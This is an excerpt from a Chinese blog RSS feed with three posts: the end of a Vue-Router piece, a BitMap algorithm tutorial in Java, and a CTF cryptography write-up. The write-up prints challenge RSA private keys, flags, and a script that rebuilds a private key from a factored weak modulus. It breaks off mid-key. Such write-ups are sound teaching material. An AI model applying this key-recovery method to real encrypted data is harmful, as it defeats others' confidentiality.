&lt;/ul&gt;&lt;p&gt;这么一看 &lt;code&gt;history&lt;/code&gt; 模式充满了 happy，感觉完全可以替代 &lt;code&gt;hash&lt;/code&gt; 模式，但其实 &lt;code&gt;history&lt;/code&gt; 也不是样样都好，虽然在浏览器里游刃有余，但真要通过 &lt;code&gt;URL&lt;/code&gt; 向后端发起 &lt;code&gt;HTTP&lt;/code&gt; 请求时，两者的差异就来了。尤其在用户手动输入 &lt;code&gt;URL&lt;/code&gt; 后回车，或者刷新（重启）浏览器的时候。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;hash&lt;/code&gt; 模式下，仅 &lt;code&gt;hash&lt;/code&gt; 符号之前的内容会被包含在请求中，如 &lt;code&gt;http://www.qqq.com&lt;/code&gt;，因此对于后端来说，即使没有做到对路由的全覆盖，也不会返回 &lt;code&gt;404&lt;/code&gt; 错误。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;history&lt;/code&gt; 模式下，前端的 &lt;code&gt;URL&lt;/code&gt; &lt;strong&gt;必须&lt;/strong&gt;和实际向后端发起请求的 &lt;code&gt;URL&lt;/code&gt; 一致，如 &lt;code&gt;http://www.qqq.com/book/id&lt;/code&gt;。如果后端缺少对 &lt;code&gt;/book/id&lt;/code&gt; 的路由处理，将返回 &lt;code&gt;404&lt;/code&gt; 错误。&lt;code&gt;Vue-Router&lt;/code&gt; 官网里如此描述：“不过这种模式要玩好，还需要后台配置支持……所以呢，你要在服务端增加一个覆盖所有情况的候选资源：如果 &lt;code&gt;URL&lt;/code&gt; 匹配不到任何静态资源，则应该返回同一个 &lt;code&gt;index.html&lt;/code&gt; 页面，这个页面就是你 &lt;code&gt;app&lt;/code&gt; 依赖的页面。”&lt;/li&gt;
&lt;li&gt;需在后端（&lt;code&gt;Apache&lt;/code&gt; 或 &lt;code&gt;Nginx&lt;/code&gt;）进行简单的路由配置，同时搭配前端路由的 &lt;code&gt;404&lt;/code&gt; 页面支持。&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Fri, 21 Sep 2018 07:14:00 +0000</pubDate>
<dc:creator>梁音</dc:creator>
<og:description>前言 总所周知，随着前端应用的业务功能起来越复杂，用户对于使用体验的要求越来越高，单面（ ）成为前端应用的主流形式。而大型单页应用最显著特点之一就是采用的前端路由跳转子页面系统，通过改变页面的 ，在不</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/liangyin/p/9686696.html</dc:identifier>
</item>
<item>
<title>【算法与数据结构专场】BitMap算法介绍 - 帅地</title>
<link>http://www.cnblogs.com/kubidemanong/p/9686428.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kubidemanong/p/9686428.html</guid>
<description>&lt;div class=&quot;markdown-here-wrapper&quot; data-md-url=&quot;https://i.cnblogs.com/EditPosts.aspx?opt=1&quot; readability=&quot;64&quot;&gt;
&lt;p&gt;我们先来看个简单的问题。&lt;br/&gt;假如给你20亿个&lt;strong&gt;非负数&lt;/strong&gt;的int型整数，然后再给你一个非负数的int型整数 t ，让你判断t是否存在于这20亿数中，你会怎么做呢？&lt;br/&gt;有人可能会用一个int数组，然后把20亿个数给存进去，然后再循环遍历一下就可以了。&lt;br/&gt;想一下，这样的话，时间复杂度是O(n)，所需要的内存空间&lt;br/&gt;4byte * 20亿，一共需要80亿个字节，&lt;br/&gt;大概需要8GB的内存空间，显然有些计算机的内存一次是加载不了这么这么多的数据的。&lt;/p&gt;
&lt;h3 id=&quot;-&quot;&gt;初步优化&lt;/h3&gt;
&lt;p&gt;按照上面的做法，时间复杂度是O(n)，内存是8GB，实际上我们是可以把时间复杂度降低到O(1)的。&lt;br/&gt;例如我们可以这样来存数据，把一个int非负整数n作为&lt;strong&gt;数组下标&lt;/strong&gt;，如果n存在，则对应的值为1，如果不存在，对应的值为0。例如数组arr[n] = 1，表示n存在，arr[n] = 0表示n不存在。&lt;br/&gt;那么，我们就可以把20亿个数作为下标来存，之后直接判断arr[t]的值，如果arr[t] = 1，则代表存在，如果arr[t] = 0，则代表不存在。这样，我们就可以把时间复杂度降低到O(1)。不过空间复杂度我们并没有降低。还稍微大了点。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;由于int非负整数一共有 2^31 个，所以数组的大小需要 2^32 这么大。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里可能有人说也可以用HashSet来存啊，时间复杂度也是近似O(1)。不过这里需要说明的是，HashSet里面存的必须是对象，也就是说需要把int包装成Integer，显然一个对象的话是更花销内存的，需要对象头啊什么的…..&lt;/p&gt;
&lt;h3 id=&quot;-&quot;&gt;再次优化&lt;/h3&gt;
&lt;p&gt;大家想一个问题，对于一个数，实际上我们只需要两种状态，就是这个数&lt;strong&gt;存在&lt;/strong&gt;和&lt;strong&gt;不存在&lt;/strong&gt;这两种可能。上面我们用1代表存在，用0代表不存在。&lt;br/&gt;也就是说，我们是可以不用int型的数组来存储的，一个int型占用4个字节，即32个二进制位，一共可以表示40亿多个状态。用int型的来存两个状态，多浪费。&lt;br/&gt;所以我们可以考虑用boolean型的来存的，boolean貌似就占用一个字节(java中的boolena貌似是占用一个字节)。而一个boolean有true和false两种状态，所以也是成立的。这样子的话占用的内存就是2GB的内存了。&lt;br/&gt;这样，就可以降低到之前的四分之1内存了。&lt;/p&gt;
&lt;h3 id=&quot;-bitmap&quot;&gt;最终优化：bitmap&lt;/h3&gt;
&lt;p&gt;大家再想一个问题，虽然boolean是表示两种状态，但是boolean实际上占用了8bit啊，按道理8bit是可以表示128种状态的。而被我们拿来表示两个状态，是否也有点浪费了呢？&lt;br/&gt;我们都知道，一个二进制位，有0和1两种状态，所以说，其实我们是可以用一个二进制位来代表一个int型的数是否存在的。例如对于1，3，5，7这四个数，如果存在的话，则可以这样表示：&lt;br/&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/9/21/165fa9ba45d557e1?w=960&amp;amp;h=144&amp;amp;f=png&amp;amp;s=7460&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;1代表这个数存在，0代表不存在。例如表中01010101代表1，3，5，7存在，0，2，4，6不存在。&lt;br/&gt;那如果8，10，14也存在怎么存呢？如图，8，10，14我们可以存在第二个字节里&lt;br/&gt;&lt;img src=&quot;https://user-gold-cdn.xitu.io/2018/9/21/165fa9bc36ec158b?w=1014&amp;amp;h=303&amp;amp;f=png&amp;amp;s=15256&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;以此类推。这样子，我们又可以把内存降低到之前的8分之一了。&lt;br/&gt;这种采用一个二进制位来存储数据的方法，我们也叫做bitmap算法。&lt;br/&gt;可能有人会问，假如我要添加一个数n，我知道它要存在第n个位那里，把第n个二进制改为1，可是我要怎么操作呢？&lt;br/&gt;&lt;strong&gt;这个对于bitmap算法是如何存储的，如何进行增删操作的，我会在之后的文章里讲，这篇就大概介绍下bitmap算法。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Java中有自带的bitmap实现，今天我们就用Java中自带的bitmap来做道题练练手。我们换道类似题目吧，不知道你一眼是否就能想到用bitmap算法来做。&lt;br/&gt;题目描述：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;现在有五十亿个int类型的正整数，要从中找出重复的数并返回。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;判断50亿个数有哪些是重复和刚才上面那个判断是否存在，其实是一样的。我们采用bitmap算法来做。不过这里50亿个数，别人肯定是以文件流的形式给你的。这样我们为了&lt;strong&gt;方便，我们就假设这些数是以存在int型数组的形式给我们的&lt;/strong&gt;。&lt;br/&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs language-java&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Test&lt;/span&gt; &lt;/span&gt;{
    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; Set&amp;lt;Integer&amp;gt; &lt;span class=&quot;hljs-title&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;[] arr)&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; j = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;
        
        Set&amp;lt;Integer&amp;gt; output = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HashSet&amp;lt;&amp;gt;();
        BitSet bitSet = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; BitSet(Integer.MAX_VALUE);
        &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;
        &lt;span class=&quot;hljs-keyword&quot;&gt;while&lt;/span&gt; (i &amp;lt; arr.length) {
            &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; value = arr[i];
            
            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (bitSet.get(value)) {
                output.add(value);
            } &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt; {
                bitSet.set(value, &lt;span class=&quot;hljs-keyword&quot;&gt;true&lt;/span&gt;);
            }
            i++;
        }
        &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; output;
    }
    
    &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{
        &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt;[] t = {&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;};
        Set&amp;lt;Integer&amp;gt; t2 = test(t);
        System.out.println(t2);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;打印结果:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[3, 4]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当然，bitmap算法的应用不仅仅是节省内存，它还有很多其他的优点。之后有机会就拿一些其他的应用来写篇文章。&lt;/p&gt;
&lt;p&gt;本次讲解到此结束。如果喜欢，可以分享给更多的小伙伴哦。&lt;/p&gt;
&lt;p&gt;bitmap的存储会在之后的文章讲哦&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;&lt;strong&gt;完&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;获取更多&lt;strong&gt;原创&lt;/strong&gt;文章，可以关注下我的公众号：&lt;strong&gt;苦逼的码农&lt;/strong&gt;，我会不定期分享一些资源和软件等。后台回复&lt;strong&gt;礼包&lt;/strong&gt;送你一份时下热门的资源大礼包。同时也感谢把文章介绍给更多需要的人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Fri, 21 Sep 2018 06:38:00 +0000</pubDate>
<dc:creator>帅地</dc:creator>
<og:description>我们先来看个简单的问题。假如给你20亿个非负数的int型整数，然后再给你一个非负数的int型整数 t ，让你判断t是否存在于这20亿数中，你会怎么做呢？有人可能会用一个int数组，然后把20亿个数给存</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kubidemanong/p/9686428.html</dc:identifier>
</item>
<item>
<title>蓝鲸安全CTF打卡题——第一期密码学 - 落花四月</title>
<link>http://www.cnblogs.com/lxz-1263030049/p/9686404.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lxz-1263030049/p/9686404.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;渣渣一枚，萌新一个，会划水，会喊六六&lt;/p&gt;
&lt;p&gt;本文首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/2778&quot; class=&quot;uri&quot;&gt;https://xz.aliyun.com/t/2778&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;再发于i春秋平台：&lt;a href=&quot;https://bbs.ichunqiu.com/thread-46119-1-1.html&quot; class=&quot;uri&quot;&gt;https://bbs.ichunqiu.com/thread-46119-1-1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;个人博客：&lt;a href=&quot;https://www.cnblogs.com/lxz-1263030049/&quot; class=&quot;uri&quot; title=&quot;落花四月&quot;&gt;https://www.cnblogs.com/lxz-1263030049/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;再过几天就是中秋节了，我打算尽自己最大的能力把蓝鲸安全平台上面的打卡题目的&lt;code&gt;writeup&lt;/code&gt;整理出来。&lt;/p&gt;
&lt;p&gt;有什么错误的地方 希望各位大佬指正(谢谢Orz)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gss0.bdstatic.com/94o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike180%2C5%2C5%2C180%2C60/sign=f34354555c0fd9f9b41a5d3b4444bf4f/d1a20cf431adcbef6eb2052fa1af2edda3cc9f10.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;一检查符号&quot;&gt;一：检查符号&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/MREkuN8.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;知识点&quot;&gt;知识点&lt;/h4&gt;
&lt;p&gt;摩斯密码、替换密码&lt;/p&gt;
&lt;h4 id=&quot;解题思路&quot;&gt;解题思路&lt;/h4&gt;
&lt;p&gt;这道题很容易就可以看出是摩斯密码 摩斯密码就是由&lt;code&gt;'.'&lt;/code&gt;和&lt;code&gt;'-'&lt;/code&gt;组成的密码 先丢在&lt;code&gt;notepad++&lt;/code&gt;里转换下&lt;/p&gt;
&lt;p&gt;把&lt;code&gt;。&lt;/code&gt;换成 空格&lt;/p&gt;
&lt;p&gt;把&lt;code&gt;o&lt;/code&gt;转换成&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;把&lt;code&gt;0&lt;/code&gt;转换成&lt;code&gt;-&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;就会得到：&lt;code&gt;....- --- ... .--- -.... -. -.-- --. --... .--. ----. -.. -.. ..--- --.. ..--- ...-- ..... .- .---&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;放在解密工具里面就会得到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/raFCrt1.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后得到答案：&lt;strong&gt;key{4osj6nyg7p9dd2z235aj}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;二-密钥生成&quot;&gt;二： 密钥生成&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/4wPDTW7.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;知识点-1&quot;&gt;知识点&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;RSA&lt;/code&gt;密钥生成 &lt;code&gt;RSA-Tool&lt;/code&gt;工具的使用&lt;/p&gt;
&lt;h4 id=&quot;解题思路-1&quot;&gt;解题思路&lt;/h4&gt;
&lt;p&gt;首先放一张关于&lt;code&gt;RSA-Tool&lt;/code&gt;工具使用的方法图；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mINaxG4.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们只需要根据上面的解释以及下面一些关于&lt;code&gt;RSA&lt;/code&gt;算法的资料就可以得到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/bDAh3ko.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;即最后答案：&lt;strong&gt;key{125631357777427553}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;三-rsa解密&quot;&gt;三： RSA解密&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/w6hut1U.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;知识点-2&quot;&gt;知识点&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;zip&lt;/code&gt;伪加密、&lt;code&gt;RSA&lt;/code&gt;解密，&lt;code&gt;openssl&lt;/code&gt;用法&lt;/p&gt;
&lt;h4 id=&quot;解题思路-2&quot;&gt;解题思路&lt;/h4&gt;
&lt;p&gt;下载下来题目，告诉我们需要解压密码&lt;/p&gt;
&lt;p&gt;这里就要涉及到伪加密的知识了&lt;/p&gt;
&lt;p&gt;解开伪加密有多种方法，包括用&lt;code&gt;7z&lt;/code&gt;，在&lt;code&gt;linux&lt;/code&gt;下直接打开，更改伪加密位置处的奇数位为&lt;code&gt;0(偶数)&lt;/code&gt;等方法，我选择使用&lt;code&gt;ZipCenOp.jar&lt;/code&gt;这个工具来解密&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 在window下
$ java -jar ZipCenOp.jar r rsa.zip&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;linux&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/VDUxTBI.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;两种都可以的(我个人更偏向于使用&lt;code&gt;linux&lt;/code&gt;),打开经过解密之后的伪加密文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/zuh1eJw.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;notepad++&lt;/code&gt;打开&lt;code&gt;imhere&lt;/code&gt;文件打开看到&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQCw44GKtDqBlD2hTQVm9oMyp7w3C8i4tCE0zsWTWtV0gVaofyF9
idBeZR3AX/crKnlX1QC6YD/pUJJRPzoKY+bk0YFT64mca7oW2fP719LFiQReirGM
fs4n9mvIYeBx1TtHfFwWBDeIHcjP33eR1hue69Dq5tZYRl2e3SrUJXvRFwIDAQAB
AoGAMUQcF1KdHOv5wkweXg/4eIpJHJe2nuLkgL26P5FD9D/1r9ZAsKNKmo/VGnhf
8fDRfQoBOueFxWjAZ8qRUsWCT+/0ZDs0xCKrQ7YuxO2p9HV1sMQF74D2TVcoFZ4d
P5sjTvs0MutaoTdU0YDNO/ssqk3We2e11tr6ii3HmHtquwkCQQDezreUOIjWV30n
ndoGwYf9LsXoEZVMSI6vw/SqiqOvagN3mufApNfj+JrZ6LvV0hHbYfaVkEUvqMyq
BKAQapNFAkEAyz2RlugQ20fVzUkzDCSF8ByWjK4GgAqQ/qioXJ9tSPcsgV1yUem4
WM7rTBDWaohHT3N+vhAcsszQ2VJZy6vKqwJBAL2liH7CLD79Uwswgg70FfM8J7oj
lUfMDp+vFIdA4JiDjRX2JUNFTHm/9tZ6Eb+rQgXQ+ZlOpoUtkZ85tqCihl0CQCQI
R16MyChIRRR/LMizVPer6dkJJWff97LebfL15OcxwzcwPQtet2svTDIRLiJ3BMWG
QWsq6hudCk3tNrRQQb8CQQCTcs0uWBe6klDKWLCPEYxuTqB9xksQTmlqvdwfdCZF
BWaxHtc/ByfAisj9cfq2CY/fEoeGqLagZ5tG5G81V9VZ
-----END RSA PRIVATE KEY-----&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看到是&lt;code&gt;RSA&lt;/code&gt;私钥文件，说明我们要用这个私钥去解密我们的&lt;code&gt;flag&lt;/code&gt;文件 这里就需要用到&lt;code&gt;openssl&lt;/code&gt;文件了 &lt;code&gt;kali&lt;/code&gt;里自带了&lt;code&gt;openssl&lt;/code&gt;工具&lt;/p&gt;
&lt;p&gt;使用命令：&lt;code&gt;openssl rsautl -decrypt -in flag -inkey imhere -out flag.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/2b3Nl7v.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;打开&lt;code&gt;flag.txt&lt;/code&gt;文件就会得到答案：&lt;strong&gt;key{c42bcf773d54cf03}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;四-公平交易&quot;&gt;四： 公平交易&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/y20fli4.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;知识点-3&quot;&gt;知识点&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;playfair&lt;/code&gt;加密 &lt;code&gt;pycipher&lt;/code&gt;库使用&lt;/p&gt;
&lt;h4 id=&quot;解题思路-3&quot;&gt;解题思路&lt;/h4&gt;
&lt;p&gt;第一种方法：&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;pycipher&lt;/code&gt;库，就可以得到答案&lt;/p&gt;
&lt;p&gt;由于&lt;code&gt;pycipher&lt;/code&gt;库是&lt;code&gt;python&lt;/code&gt;中的第三方库，所以使用的时候需要安装即：&lt;code&gt;pip install pycipher&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Yelr0AW.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;pycipher&lt;/code&gt;就可以得到答案：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/pcsA2nP.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第二种方法：&lt;/p&gt;
&lt;p&gt;使用在线解密工具：&lt;a href=&quot;http://www.practicalcryptography.com/ciphers/classical-era/playfair/&quot; class=&quot;uri&quot;&gt;http://www.practicalcryptography.com/ciphers/classical-era/playfair/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/OLUsItq.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后得到答案：&lt;strong&gt;key{WHALECTFISVERYFAIR}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;五填空题&quot;&gt;五：填空题&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mw8c1DJ.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;知识点-4&quot;&gt;知识点&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;utf-9&lt;/code&gt;编码，替换密码，进制&lt;code&gt;ascii&lt;/code&gt;码转换&lt;/p&gt;
&lt;h4 id=&quot;解题思路-4&quot;&gt;解题思路&lt;/h4&gt;
&lt;p&gt;下载得到一个叫做&lt;code&gt;flag_is_here_rfc4042&lt;/code&gt;的文件 看到&lt;code&gt;rfc4042&lt;/code&gt;，知道了应该是&lt;code&gt;utf-9&lt;/code&gt;编码了文件用&lt;code&gt;python2&lt;/code&gt;来解，我们需要先安装&lt;code&gt;VCForPython27.msi&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来就是需要安装&lt;code&gt;UTF-9&lt;/code&gt;文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/D37RdfY.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;关于&lt;code&gt;UTF-9&lt;/code&gt;中的问题，我们只需要写一段&lt;code&gt;python&lt;/code&gt;代码就可以解决了：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;import utf9
f1 = open('flag_is_here_rfc4042','r')
f2 = open('flag.txt','w')
str1 = f1.read()
print utf9.utf9decode(str1)
f2.write(utf9.utf9decode(str1))&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们采用的是直接读取&lt;code&gt;flag_is_here_rfc4042&lt;/code&gt;文件的方法是为了避免复制粘贴时格式出现问题,下面就是具体的操作方法：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/JohkG48.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们先来分析一下关于解密出来的内容：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/GXJtT6Y.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们由以上的分析可以写出脚本：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;import binascii
_ = 1
__ = 2
___ = 3
____ = 4
_____ = 5
______ = 6
_______ = 7
________ = 8
_________ = 9

a = _____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___
a = hex(a)[2:][:-1]
a = binascii.a2b_hex(a)
print a&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行之后就会得到：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/g3D5yFP.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最后得到答案：&lt;strong&gt;key{I_4m-k3y}&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;六rsa破解&quot;&gt;六：RSA破解&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ua88GJ2.png&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;知识点-5&quot;&gt;知识点&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;RSA&lt;/code&gt;模数分解，&lt;code&gt;RSA&lt;/code&gt;解密 &lt;code&gt;openssl&lt;/code&gt;使用方法&lt;/p&gt;
&lt;h4 id=&quot;解题思路-5&quot;&gt;解题思路&lt;/h4&gt;
&lt;p&gt;下载并打开压缩包文件就会发现：&lt;/p&gt;
&lt;p&gt;这是一个加密的&lt;code&gt;flag&lt;/code&gt;文件和公钥文件 我们先通过&lt;code&gt;openssl&lt;/code&gt;来分析一下公钥是否可以被攻击&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;linux&lt;/code&gt;，其中的命令是：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;openssl rsa -pubin -text -modulus -in public.pem &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/mFuJC6E.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们接着使用&lt;code&gt;msieve&lt;/code&gt;就可以了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ZDa8T1D.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;就会得到相应的&lt;code&gt;P Q&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们需要使用脚本生成使用文件&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;import math

import sys

from Crypto.PublicKey import RSA
keypair = RSA.generate(1024)

keypair.p = 290579950064240059571837821251441436997

keypair.q = 314436328879392457343835667929324128609

keypair.e = 65537

keypair.n = keypair.p * keypair.q

Qn = long((keypair.p-1) * (keypair.q-1))

i = 1

while (True):

x = (Qn * i ) + 1

if (x % keypair.e == 0):

keypair.d = x / keypair.e

break

i += 1

private = open('private.pem','w')

private.write(keypair.exportKey())

private.close() &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;linux&lt;/code&gt;运行脚本很简单 进入文件直接使用命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python prikeygen.py&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就会生成相应的私钥&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
MIGpAgEAAiEAygD17Xszub1CHncxiqF4513t48sbx9R6fRQ750kckCUCAwEAAQIg
XbBsX6TQrMj2raKiu6WAqRtv86ps6lbgXsftak7iqgECEQDam6mnJeZJM1o5QlZY
XKlFAhEA7I478Iv1HnDUJ/xGsCkJYQIQFvqv7bMNLvqn7Ebt3qH25QIQFwZlKS3G
Rxc+X0H782ubIQIQL2kzJ1i8luHD5eQlbYjXgg==
